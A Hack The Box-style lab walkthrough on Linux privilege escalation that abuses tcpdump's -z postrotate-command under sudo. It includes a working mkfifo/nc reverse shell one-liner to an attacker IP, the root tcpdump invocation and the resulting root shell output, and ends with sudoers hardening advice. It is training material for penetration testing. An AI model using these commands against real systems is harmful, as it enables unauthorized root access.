
```shell
htb_student@NIX02:~$ sudo -l
```

```shell
htb_student@NIX02:~$ man tcpdump 

<SNIP> 
-z postrotate-command 

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

```shell
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Let's try this out. First, make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner.

```shell
htb_student@NIX02:~$ cat /tmp/.test 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

Next, start a `netcat` listener on our attacking box and run `tcpdump` as root with the `postrotate-command`. If all goes to plan, we will receive a root reverse shell connection.

```shell
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

```shell
3kjS@htb[/htb]$ nc -lnvp 443 

listening on [any] 443 ... 
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938 
bash: cannot set terminal process group (10797): Inappropriate ioctl for device 
bash: no job control in this shell 

root@NIX02:~# id && hostname 
id && hostname 
uid=0(root) gid=0(root) groups=0(root) 
NIX02
```

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`


| 1.  | Always specify the absolute path to any binaries listed in the `sudoers` file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the `sudoers` entry specifies `cat` instead of `/bin/cat` this could likely be abused). |
| --- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2.  | Grant `sudo` rights sparingly and based on the principle of least privilege. Does the user need full `sudo` rights? Can they still perform their job with one or two entries in the `sudoers` file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.                                    |
